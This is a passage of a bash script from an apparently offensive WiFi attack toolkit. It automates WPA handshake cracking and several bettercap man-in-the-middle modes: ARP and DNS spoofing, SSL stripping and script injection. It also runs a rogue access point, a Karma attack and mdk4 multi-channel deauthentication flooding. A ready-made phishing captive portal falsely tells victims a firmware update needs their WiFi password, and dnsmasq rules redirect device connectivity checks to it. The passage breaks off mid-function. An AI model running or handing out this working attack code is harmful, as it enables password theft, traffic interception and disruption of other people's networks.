    echo -e "${GRAY}================${NC}"
    echo ""

    if ! select_capture_file "Select capture file to verify:"; then
        pause
        return
    fi

    local cap_file="$CAPTURE_FILE"
    echo -e "${YELLOW}[*] Verifying: $(basename "$cap_file")${NC}"
    echo ""

    local result=$(aircrack-ng "$cap_file" 2>&1)
    echo "$result"
    echo ""

    if echo "$result" | grep -q "1 handshake"; then
        success "Valid handshake found!"
    elif echo "$result" | grep -q "No networks found"; then
        if [[ "$cap_file" == *.hc22000 ]]; then
            success "PMKID hash valid!"
        else
            warning "No handshake in this file"
        fi
    else
        warning "Handshake verification inconclusive"
    fi

    pause
}

# Crack with aircrack-ng
crack_aircrack() {
    clear
    echo -e "${BLUE}Crack with Aircrack-ng${NC}"
    echo -e "${GRAY}======================${NC}"
    echo ""

    if ! select_capture_file "Select handshake file to crack:"; then
        pause
        return
    fi
    local cap_file="$CAPTURE_FILE"

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    if [[ ! -f "$wordlist" ]]; then
        if [[ -f "${wordlist}.gz" ]]; then
            echo -e "${YELLOW}[*] Decompressing wordlist...${NC}"
            gunzip -k "${wordlist}.gz"
        else
            echo -e "${RED}[!] Wordlist not found: $wordlist${NC}"
            pause
            return
        fi
    fi

    echo -e "${YELLOW}[*] Starting aircrack-ng...${NC}"
    echo -e "${YELLOW}[*] Capture: $cap_file${NC}"
    echo -e "${YELLOW}[*] Wordlist: $wordlist${NC}"
    echo ""

    aircrack-ng -w "$wordlist" "$cap_file"

    pause
}

# Crack with hashcat
crack_hashcat() {
    clear
    echo -e "${BLUE}Crack with Hashcat (GPU)${NC}"
    echo -e "${GRAY}========================${NC}"
    echo ""

    if ! command -v hashcat &>/dev/null; then
        echo -e "${RED}[!] hashcat not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hashcat${NC}"
        pause
        return
    fi

    if ! select_capture_file "Select hash/capture file:"; then
        pause
        return
    fi
    local hash_file="$CAPTURE_FILE"

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo ""
    echo -e "${WHITE}Attack mode:${NC}"
    echo -e "${CYAN}[1]${NC} Dictionary attack"
    echo -e "${CYAN}[2]${NC} Dictionary + rules"
    echo -e "${CYAN}[3]${NC} Brute force (mask)"
    echo -e "${CYAN}[4]${NC} Combinator attack"
    echo ""

    read -p "Select mode: " attack_mode

    local hash_mode="22000"
    [[ "$hash_file" == *.hccapx ]] && hash_mode="2500"
    [[ "$hash_file" == *.cap ]] && hash_mode="2500"

    case $attack_mode in
        1)
            echo -e "${YELLOW}[*] Starting hashcat dictionary attack...${NC}"
            hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" --status --status-timer=10
            ;;
        2)
            echo -e "${WHITE}Rule files:${NC}"
            echo -e "${CYAN}[1]${NC} best64.rule (fast)"
            echo -e "${CYAN}[2]${NC} rockyou-30000.rule (thorough)"
            echo -e "${CYAN}[3]${NC} dive.rule (comprehensive)"
            echo -e "${CYAN}[4]${NC} Custom rule file"
            echo ""
            read -p "Select rule: " rule_choice

            local rule_file=""
            case $rule_choice in
                1) rule_file="/usr/share/hashcat/rules/best64.rule" ;;
                2) rule_file="/usr/share/hashcat/rules/rockyou-30000.rule" ;;
                3) rule_file="/usr/share/hashcat/rules/dive.rule" ;;
                4) read -p "Enter rule file path: " rule_file ;;
            esac

            if [[ -f "$rule_file" ]]; then
                hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" -r "$rule_file" --status --status-timer=10
            else
                echo -e "${RED}[!] Rule file not found${NC}"
            fi
            ;;
        3)
            echo -e "${WHITE}Common masks:${NC}"
            echo -e "${CYAN}[1]${NC} ?d?d?d?d?d?d?d?d        (8-digit numbers)"
            echo -e "${CYAN}[2]${NC} ?l?l?l?l?l?l?l?l        (8 lowercase)"
            echo -e "${CYAN}[3]${NC} ?u?l?l?l?l?l?d?d        (Name + 2 digits)"
            echo -e "${CYAN}[4]${NC} Custom mask"
            echo ""
            read -p "Select mask: " mask_choice

            local mask=""
            case $mask_choice in
                1) mask="?d?d?d?d?d?d?d?d" ;;
                2) mask="?l?l?l?l?l?l?l?l" ;;
                3) mask="?u?l?l?l?l?l?d?d" ;;
                4) read -p "Enter mask: " mask ;;
            esac

            if [[ -n "$mask" ]]; then
                hashcat -m "$hash_mode" -a 3 "$hash_file" "$mask" --status --status-timer=10
            fi
            ;;
        4)
            read -p "Enter second wordlist: " wordlist2
            if [[ -f "$wordlist2" ]]; then
                hashcat -m "$hash_mode" -a 1 "$hash_file" "$wordlist" "$wordlist2" --status --status-timer=10
            else
                echo -e "${RED}[!] Second wordlist not found${NC}"
            fi
            ;;
    esac

    pause
}

# Crack with John the Ripper
crack_john() {
    clear
    echo -e "${BLUE}Crack with John the Ripper${NC}"
    echo -e "${GRAY}==========================${NC}"

    if ! command -v john &>/dev/null; then
        echo -e "${RED}[!] John the Ripper not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install john${NC}"
        pause
        return
    fi

    read -p "Enter path to capture file (.cap): " cap_file
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    # Convert to john format
    local john_file="${cap_file%.cap}.john"
    if command -v wpapcap2john &>/dev/null; then
        wpapcap2john "$cap_file" > "$john_file" 2>/dev/null
    elif command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool "$cap_file" -o "${cap_file%.cap}.hc22000" 2>/dev/null
        john_file="${cap_file%.cap}.hc22000"
    else
        echo -e "${RED}[!] No conversion tool available${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo -e "${YELLOW}[*] Starting John the Ripper...${NC}"
    john --wordlist="$wordlist" "$john_file"

    echo ""
    echo -e "${YELLOW}[*] Results:${NC}"
    john --show "$john_file"

    pause
}

# Convert handshake formats
convert_handshake() {
    clear
    echo -e "${BLUE}Convert Handshake Format${NC}"
    echo -e "${GRAY}========================${NC}"

    read -p "Enter path to capture file: " input_file
    if [[ ! -f "$input_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    echo ""
    echo -e "${WHITE}Convert to:${NC}"
    echo -e "${CYAN}[1]${NC} .hc22000 (hashcat WPA)"
    echo -e "${CYAN}[2]${NC} .hccapx (hashcat legacy)"
    echo -e "${CYAN}[3]${NC} Clean .cap (wpaclean)"
    echo ""

    read -p "Select format: " choice

    case $choice in
        1)
            local output="${input_file%.*}.hc22000"
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool "$input_file" -o "$output" 2>/dev/null
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion produced empty output"
            else
                echo -e "${RED}[!] hcxpcapngtool not found (install hcxtools)${NC}"
            fi
            ;;
        2)
            local output="${input_file%.*}.hccapx"
            if command -v cap2hccapx &>/dev/null; then
                cap2hccapx "$input_file" "$output"
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion failed"
            else
                echo -e "${RED}[!] cap2hccapx not found (install hcxtools)${NC}"
            fi
            ;;
        3)
            local output="${input_file%.*}-clean.cap"
            wpaclean "$output" "$input_file" 2>/dev/null
            [[ -s "$output" ]] && success "Cleaned to: $output" || warning "Cleaning failed"
            ;;
    esac

    pause
}

# Manage wordlists
manage_wordlists() {
    clear
    echo -e "${BLUE}Wordlist Manager${NC}"
    echo -e "${GRAY}================${NC}"

    echo -e "${WHITE}Wordlist Options:${NC}"
    echo -e "${CYAN}[1]${NC} List available wordlists"
    echo -e "${CYAN}[2]${NC} Decompress rockyou.txt.gz"
    echo -e "${CYAN}[3]${NC} Generate custom wordlist (crunch)"
    echo -e "${CYAN}[4]${NC} Merge wordlists"
    echo -e "${CYAN}[5]${NC} Sort and deduplicate wordlist"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo ""
            echo -e "${WHITE}System wordlists:${NC}"
            for wl in /usr/share/wordlists/*; do
                [[ -e "$wl" ]] || continue
                echo -e "  ${CYAN}$(basename "$wl")${NC} ${GRAY}($(get_file_size "$wl"))${NC}"
            done
            echo ""
            echo -e "${WHITE}SecLists (if installed):${NC}"
            if [[ -d "/usr/share/seclists" ]]; then
                ls /usr/share/seclists/Passwords/ 2>/dev/null | head -10
                echo -e "${GRAY}  ...and more${NC}"
            else
                echo -e "${YELLOW}  [!] Not installed. Install with: sudo apt install seclists${NC}"
            fi
            ;;
        2)
            if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
                echo -e "${YELLOW}[*] Decompressing rockyou.txt.gz...${NC}"
                gunzip -k /usr/share/wordlists/rockyou.txt.gz
                success "Decompressed to /usr/share/wordlists/rockyou.txt"
            elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
                echo -e "${GREEN}[✓] rockyou.txt already decompressed${NC}"
            else
                echo -e "${RED}[!] rockyou.txt not found${NC}"
            fi
            ;;
        3)
            if ! command -v crunch &>/dev/null; then
                echo -e "${RED}[!] crunch not found. Install with: sudo apt install crunch${NC}"
            else
                read -p "Min length: " min_len
                read -p "Max length: " max_len
                read -p "Character set [abcdefghijklmnopqrstuvwxyz0123456789]: " charset
                charset="${charset:-abcdefghijklmnopqrstuvwxyz0123456789}"
                read -p "Output file: " output_file

                echo -e "${YELLOW}[*] Generating wordlist...${NC}"
                crunch "$min_len" "$max_len" "$charset" -o "$output_file"
                [[ -f "$output_file" ]] && success "Wordlist saved to $output_file"
            fi
            ;;
        4)
            read -p "Enter wordlist paths (space-separated): " -a lists
            read -p "Output file: " output_file
            cat "${lists[@]}" 2>/dev/null | sort -u > "$output_file"
            [[ -s "$output_file" ]] && success "Merged $(wc -l < "$output_file") unique words to $output_file"
            ;;
        5)
            read -p "Enter wordlist path: " wl_file
            if [[ -f "$wl_file" ]]; then
                local before=$(wc -l < "$wl_file")
                sort -u "$wl_file" -o "$wl_file"
                local after=$(wc -l < "$wl_file")
                success "Deduplicated: $before -> $after entries (removed $((before - after)) duplicates)"
            fi
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════
# Advanced Attacks Menu (Main Menu Option 7)
# ══════════════════════════════════════════════════════════════

advanced_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}                  ADVANCED ATTACKS                       ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} WPS PIN Recovery          ${GRAY}Reaver / Bully attacks${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Deauthentication          ${GRAY}Targeted / broadcast${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} MITM Attack               ${GRAY}Man-in-the-middle setup${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Rogue Access Point        ${GRAY}Fake AP with hostapd${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} Karma Attack              ${GRAY}Auto-respond to probes${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Jamming Detection         ${GRAY}Detect WiFi jammers${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Channel Hopping DoS       ${GRAY}Multi-channel deauth${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) wps_attacks ;;
            2) dos_attacks ;;
            3) mitm_attack ;;
            4) rogue_ap ;;
            5) karma_attack ;;
            6) jamming_detection ;;
            7) channel_hop_dos ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# MITM attack setup
mitm_attack() {
    clear
    echo -e "${BLUE}Man-in-the-Middle Attack${NC}"
    echo -e "${GRAY}========================${NC}"

    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
        pause
        return
    fi

    echo -e "${WHITE}MITM Options:${NC}"
    echo -e "${CYAN}[1]${NC} ARP spoofing + sniffing"
    echo -e "${CYAN}[2]${NC} DNS spoofing"
    echo -e "${CYAN}[3]${NC} SSL stripping"
    echo -e "${CYAN}[4]${NC} Packet injection"
    echo ""

    read -p "Select option: " choice

    # Get internet interface
    local iface=$(get_internet_interface)

    if [[ -z "$iface" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        iface=$(select_internet_interface)

        if [[ -z "$iface" ]]; then
            error "No internet interface selected. MITM attacks require internet connectivity."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $iface${NC}"
    echo ""

    case $choice in
        1)
            echo -e "${YELLOW}[*] Starting ARP spoof + network sniffing...${NC}"
            echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set arp.spoof.fullduplex true; arp.spoof on"
            ;;
        2)
            read -p "Enter domain to spoof: " target_domain
            read -p "Redirect to IP: " redirect_ip
            echo -e "${YELLOW}[*] Starting DNS spoof for $target_domain -> $redirect_ip${NC}"
            bettercap -iface "$iface" -eval "set dns.spoof.domains $target_domain; set dns.spoof.address $redirect_ip; dns.spoof on; arp.spoof on"
            ;;
        3)
            echo -e "${YELLOW}[*] Starting SSL strip attack...${NC}"
            echo -e "${RED}[!] Many modern sites use HSTS - effectiveness varies${NC}"
            bettercap -iface "$iface" -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on; net.sniff on"
            ;;
        4)
            echo -e "${YELLOW}[*] Starting packet injection mode...${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set http.proxy.injectjs alert('injected'); http.proxy on; arp.spoof on"
            ;;
    esac

    pause
}

# Rogue access point
rogue_ap() {
    clear
    echo -e "${BLUE}Rogue Access Point${NC}"
    echo -e "${GRAY}==================${NC}"

    if ! command -v hostapd &>/dev/null; then
        echo -e "${RED}[!] hostapd not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hostapd${NC}"
        pause
        return
    fi

    local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi

    # Get internet interface for NAT
    local internet=$(get_internet_interface)

    if [[ -z "$internet" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        internet=$(select_internet_interface)

        if [[ -z "$internet" ]]; then
            error "No internet interface selected. Rogue AP requires internet for NAT."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $internet${NC}"
    echo ""

    read -p "SSID for rogue AP: " rogue_ssid
    read -p "Channel [6]: " rogue_channel
    rogue_channel="${rogue_channel:-6}"

    echo -e "${WHITE}Authentication:${NC}"
    echo -e "${CYAN}[1]${NC} Open (no password)"
    echo -e "${CYAN}[2]${NC} WPA2 with password"
    echo ""
    read -p "Select: " auth_choice

    local temp_dir=$(create_temp_dir)
    local hostapd_conf="$temp_dir/hostapd.conf"

    cat > "$hostapd_conf" << EOF
interface=$interface
driver=nl80211
ssid=$rogue_ssid
hw_mode=g
channel=$rogue_channel
wmm_enabled=0
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

    if [[ "$auth_choice" == "2" ]]; then
        read -p "WPA2 password (8+ chars): " rogue_pass
        cat >> "$hostapd_conf" << EOF
auth_algs=1
wpa=2
wpa_passphrase=$rogue_pass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    fi

    # Configure DHCP
    local dnsmasq_conf="$temp_dir/dnsmasq.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

    echo -e "${YELLOW}[*] Starting rogue AP: $rogue_ssid${NC}"

    # Configure interface
    ifconfig "$interface" 10.0.0.1 netmask 255.255.255.0 up

    # Enable IP forwarding and NAT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$internet" -j MASQUERADE
    iptables -A FORWARD -i "$interface" -o "$internet" -j ACCEPT

    # Start services
    dnsmasq -C "$dnsmasq_conf" &
    local dnsmasq_pid=$!

    hostapd "$hostapd_conf"

    # Cleanup
    kill $dnsmasq_pid 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -D POSTROUTING -o "$internet" -j MASQUERADE 2>/dev/null
    iptables -D FORWARD -i "$interface" -o "$internet" -j ACCEPT 2>/dev/null
    clean_temp_dir "$temp_dir"

    pause
}

# Karma attack
karma_attack() {
    clear
    echo -e "${BLUE}Karma Attack${NC}"
    echo -e "${GRAY}============${NC}"

    echo -e "${WHITE}Karma responds to ALL probe requests, creating matching APs${NC}"
    echo -e "${YELLOW}[!] Devices will auto-connect to remembered networks${NC}"
    echo ""

    if command -v bettercap &>/dev/null; then
        local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi
        echo -e "${YELLOW}[*] Starting Karma attack on $interface...${NC}"
        echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
        bettercap -iface "$interface" -eval "set wifi.ap.open true; wifi.recon on; wifi.ap"
    else
        echo -e "${RED}[!] bettercap required for Karma attack${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
    fi

    pause
}

# Jamming detection
jamming_detection() {
    clear
    echo -e "${BLUE}WiFi Jamming Detection${NC}"
    echo -e "${GRAY}======================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    echo -e "${YELLOW}[*] Monitoring for jamming activity on $interface${NC}"
    echo -e "${YELLOW}[*] Watching for unusual deauth/disassoc frame rates${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    echo ""

    # Monitor deauth frames
    tcpdump -i "$interface" -e -c 500 'type mgt subtype deauth or type mgt subtype disassoc' 2>/dev/null | \
    while read -r line; do
        echo -e "${RED}[DEAUTH]${NC} $line"
    done

    pause
}

# Channel hopping DoS
channel_hop_dos() {
    clear
    echo -e "${BLUE}Channel Hopping DoS${NC}"
    echo -e "${GRAY}===================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    if ! command -v mdk4 &>/dev/null; then
        echo -e "${RED}[!] mdk4 not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install mdk4${NC}"
        pause
        return
    fi

    read -p "Enter target BSSID: " target_bssid
    read -p "Channels to attack (comma-separated, e.g. 1,6,11): " channels

    echo -e "${YELLOW}[*] Starting multi-channel deauth...${NC}"
    echo -e "${YELLOW}[*] Target: $target_bssid${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"

    if [[ -n "$target_bssid" ]]; then
        local target_file=$(mktemp)
        echo "$target_bssid" > "$target_file"
        mdk4 "$interface" d -b "$target_file" -c "${channels//,/ }"
        rm -f "$target_file"
    else
        mdk4 "$interface" d -c "${channels//,/ }"
    fi

    pause
}

# ══════════════════════════════════════════════════════════════
# Evil Twin Infrastructure (used by captive-portal.sh)
# ══════════════════════════════════════════════════════════════

# Create basic captive portal HTML
create_basic_portal() {
    local portal_dir="$1"
    local ssid="$2"

    cat > "$portal_dir/index.html" << PORTALEOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${ssid} - Network Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: #16213e; border-radius: 20px; box-shadow: 0 25px 80px rgba(0,0,0,0.5); max-width: 400px; width: 100%; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }
        .header { padding: 40px 30px 25px; text-align: center; }
        .lock-icon { width: 70px; height: 70px; background: rgba(233,69,96,0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .lock-icon svg { color: #e94560; }
        .wifi-name { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 6px; word-break: break-all; }
        .notice { background: rgba(233,69,96,0.1); border: 1px solid rgba(233,69,96,0.2); border-radius: 10px; padding: 14px 18px; margin: 0 30px 5px; }
        .notice p { color: #e94560; font-size: 13px; font-weight: 500; line-height: 1.4; text-align: center; }
        .form-area { padding: 25px 30px 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 500; color: #a2a8d3; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
        input[type="password"] { width: 100%; padding: 14px 16px; background: #0f3460; border: 2px solid rgba(255,255,255,0.08); border-radius: 10px; font-size: 16px; color: #fff; transition: all 0.3s; }
        input[type="password"]:focus { outline: none; border-color: #e94560; box-shadow: 0 0 0 3px rgba(233,69,96,0.15); }
        input[type="password"]::placeholder { color: #4a5568; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #e94560, #c23152); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; letter-spacing: 0.3px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(233,69,96,0.4); }
        .btn:active { transform: translateY(0); }
        .info { padding: 15px 30px 20px; text-align: center; }
        .info p { font-size: 11px; color: #4a5568; line-height: 1.5; }
        .router-info { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); }
        .router-info svg { color: #4a5568; }
        .router-info span { font-size: 11px; color: #4a5568; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lock-icon">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>
            <div class="wifi-name">${ssid}</div>
        </div>
        <div class="notice">
            <p>Your router requires re-authentication due to a firmware update. Please enter your WiFi password to reconnect.</p>
        </div>
        <form method="POST" action="/" class="form-area">
            <div class="form-group">
                <label for="password">WiFi Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required autocomplete="off" minlength="8">
            </div>
            <button type="submit" class="btn">Reconnect</button>
        </form>
        <div class="info">
            <p>This is a secure network authentication page. Your password is encrypted and used only to restore your connection.</p>
        </div>
        <div class="router-info">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
                <circle cx="12" cy="20" r="1"></circle>
            </svg>
            <span>Network Authentication Service</span>
        </div>
    </div>
</body>
</html>
PORTALEOF
}

# Start Evil Twin attack infrastructure
start_evil_twin_attack() {
    local interface="$1"
    local monitor_interface="$2"
    local target_bssid="$3"
    local target_channel="$4"
    local target_essid="$5"
    local portal_dir="$6"

    local temp_dir=$(create_temp_dir)

    # hostapd config - open network for captive portal
    cat > "$temp_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=$target_channel
beacon_int=100
dtim_period=2
max_num_sta=255
macaddr_acl=0
auth_algs=1
wmm_enabled=1
ieee80211n=1
ignore_broadcast_ssid=0
disassoc_low_ack=1
EOF

    # dnsmasq config - provide DHCP and DNS with internet access
    cat > "$temp_dir/dnsmasq.conf" << EOF
interface=$interface
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

# Forward all DNS to Google DNS for real internet access
server=8.8.8.8
server=8.8.4.4

# Redirect captive portal detection URLs to our portal
# Android
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/connectivitycheck.android.com/10.0.0.1
address=/clients3.google.com/10.0.0.1
address=/play.googleapis.com/10.0.0.1
address=/www.google.com/10.0.0.1
address=/www.gstatic.com/10.0.0.1
# iOS / macOS (full CNAME chain)
address=/captive.apple.com/10.0.0.1
address=/captive.g.aaplimg.com/10.0.0.1
address=/captive-cidr.origin-apple.com.akadns.net/10.0.0.1
address=/captive-geo.origin-apple.com.akadns.net/10.0.0.1
address=/www.apple.com/10.0.0.1
address=/www.itools.info/10.0.0.1
address=/www.ibook.info/10.0.0.1
address=/www.airport.us/10.0.0.1
address=/www.thinkdifferent.us/10.0.0.1
address=/www.appleiphonecell.com/10.0.0.1
# Samsung
address=/connectivitycheck.samsung.com/10.0.0.1
address=/d3gk5grs8qgzml.cloudfront.net/10.0.0.1
# Huawei / Xiaomi
address=/connectivitycheck.platform.hicloud.com/10.0.0.1
address=/connect.rom.miui.com/10.0.0.1
# Windows
address=/www.msftconnecttest.com/10.0.0.1
address=/www.msftncsi.com/10.0.0.1
address=/ipv4.msftconnecttest.com/10.0.0.1
address=/dns.msftncsi.com/10.0.0.1
address=/www.msn.com/10.0.0.1
# Firefox
address=/detectportal.firefox.com/10.0.0.1
# Chrome
address=/www.google.com/generate_204/10.0.0.1

# Logging
log-queries
log-dhcp
log-facility=$temp_dir/dnsmasq.log
EOF

    # Kill any existing processes that might interfere
    pkill -f "dnsmasq" 2>/dev/null
    pkill -f "hostapd" 2>/dev/null
    pkill -f "lighttpd" 2>/dev/null
    pkill -f "capture_server" 2>/dev/null
    sleep 2

    # Ensure interface is up - hostapd will manage it further
    ip link set "$interface" up 2>/dev/null
    sleep 1

    # Set up internet connectivity (NAT)
    echo -e "${YELLOW}[*] Setting up internet connectivity...${NC}"
    echo -e "${WHITE}The rogue AP needs an internet source to forward victim traffic.${NC}"
    echo ""

    # Show all available interfaces with status
    echo -e "${WHITE}Available internet interfaces:${NC}"
    echo -e "${GRAY}────────────────────────────────────────────────────${NC}"
    local inet_count=0
    local inet_ifaces=()
    local default_iface=$(ip route 2>/dev/null | grep "^default" | head -1 | awk '{print $5}')

    for iface in $(ip -o link show | awk -F': ' '{print $2}' | grep -v "^lo$" | grep -v "^$monitor_interface$" | grep -v "^$interface$"); do
        local ip_addr=$(ip addr show "$iface" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'/' -f1 | head -1)
        local state="down"
        if ip link show "$iface" 2>/dev/null | grep -q "state UP"; then
            state="up"
        fi

        # Skip interfaces with no IP or that are down (not useful for internet)
        if [[ "$state" == "up" ]] || [[ -n "$ip_addr" ]]; then
            inet_count=$((inet_count + 1))
            inet_ifaces+=("$iface")

            local is_default=""
            if [[ "$iface" == "$default_iface" ]]; then
                is_default=" ${GREEN}(default route)${NC}"
            fi

            local iface_type="Ethernet"
            if iwconfig "$iface" 2>/dev/null | grep -q "ESSID"; then
                local connected_ssid=$(iwconfig "$iface" 2>/dev/null | grep "ESSID:" | sed 's/.*ESSID:"\(.*\)".*/\1/')
                iface_type="WiFi → $connected_ssid"
            fi

            printf "  ${CYAN}[%d]${NC} %-10s ${WHITE}%-15s${NC} %-8s IP: %-15s%b\n" \
                "$inet_count" "$iface" "$iface_type" "($state)" "${ip_addr:-none}" "$is_default"
        fi
    done
    echo -e "${GRAY}────────────────────────────────────────────────────${NC}"
    echo -e "  ${CYAN}[0]${NC} No internet (captive portal only)"
    echo ""

    local internet_iface=""
    if [[ $inet_count -eq 0 ]]; then
        echo -e "${YELLOW}[!] No interfaces with internet connectivity found${NC}"
    elif [[ $inet_count -eq 1 ]]; then
        internet_iface="${inet_ifaces[0]}"
        echo -e "${GREEN}[✓] Auto-selected: $internet_iface (only available)${NC}"
        read -p "Use $internet_iface? (Y/n): " confirm
        if [[ "$confirm" =~ ^[Nn]$ ]]; then
            internet_iface=""
        fi
    else
        read -p "Select internet interface (1-$inet_count) [0 for none]: " inet_choice
        inet_choice="${inet_choice:-0}"
        if [[ "$inet_choice" -ge 1 ]] && [[ "$inet_choice" -le $inet_count ]]; then
            internet_iface="${inet_ifaces[$((inet_choice - 1))]}"
        fi
    fi

    if [[ -n "$internet_iface" ]]; then
        # Verify the selected interface actually has an IP address
        local selected_ip=$(ip addr show "$internet_iface" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'/' -f1 | head -1)
        if [[ -z "$selected_ip" ]]; then
            echo -e "${RED}[!] WARNING: $internet_iface has no IP address - internet forwarding will NOT work${NC}"
            echo -e "${YELLOW}[!] Make sure $internet_iface is connected to a network with DHCP${NC}"
            read -p "Continue anyway? (y/N): " continue_anyway
